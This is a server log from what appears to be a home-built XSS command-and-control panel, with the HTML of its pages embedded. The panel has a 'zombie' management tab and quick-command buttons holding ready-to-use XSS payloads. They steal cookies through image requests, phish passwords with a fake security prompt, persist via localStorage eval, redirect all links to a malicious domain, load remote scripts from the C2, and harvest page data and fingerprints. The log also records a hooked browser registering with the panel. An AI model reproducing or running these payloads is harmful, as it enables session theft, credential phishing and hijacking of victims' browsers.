encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T15:07:45.211Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 23:07:45.221365</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-26 23:29:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:29:49] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 23:29:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:29:49] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-26 23:29:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:29:49] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 23:29:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 23:29:51 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 23:29:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 23:29:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:29:51] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 23:29:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 23:29:53 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 23:29:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 1856 bytes [200 OK]>
2025-06-26 23:29:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:29:53] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-27 14:10:32 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-27 14:10:32 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-27 14:10:32 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-27 14:10:32 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-27 14:10:32 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-27 14:10:32 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-27 14:10:32 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-27 14:10:32 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-27 14:10:32 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-27 14:10:32 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 6612
2025-06-27 14:10:36 | INFO     | start_flaresolverr.py:127 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-27 14:10:36 | INFO     | start_flaresolverr.py:288 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-27 14:10:36 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-27 14:10:36 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-27 14:10:36 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-27 14:10:36 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-27 15:14:47 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-27 15:14:47 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-27 15:14:47 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-27 15:14:47 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-27 15:14:47 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-27 15:14:47 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-27 15:14:47 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-27 15:14:47 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-27 15:14:47 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-27 15:14:47 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 51592
2025-06-27 15:14:51 | INFO     | start_flaresolverr.py:127 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-27 15:14:51 | INFO     | start_flaresolverr.py:288 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-27 15:14:51 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-27 15:14:51 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-27 15:14:51 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-27 15:14:51 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-27 15:15:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-27 15:15:00 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-27 15:15:00 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-27 15:15:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0279s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>扫描目标管理系统</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n</body>\n\n\n</html>'
2025-06-27 15:15:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:00] "GET / HTTP/1.1" 200 -
2025-06-27 15:15:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:00] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-27 15:15:01 | INFO     | flaresolverr_route.py:232 | flaresolverr_dashboard() | 載入 FlareSolverr 管理界面
2025-06-27 15:15:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:01] "GET /api/flaresolverr/dashboard HTTP/1.1" 200 -
2025-06-27 15:15:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:01] "[36mGET /static/css/vulnerability/vulnerability.css HTTP/1.1[0m" 304 -
2025-06-27 15:15:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:01] "[36mGET /static/js/vulnerability.js HTTP/1.1[0m" 304 -
2025-06-27 15:15:01 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-27 15:15:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:01] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-27 15:15:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:01] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-27 15:15:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:03] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-27 15:15:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-27 15:15:04 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-27 15:15:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0077s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls 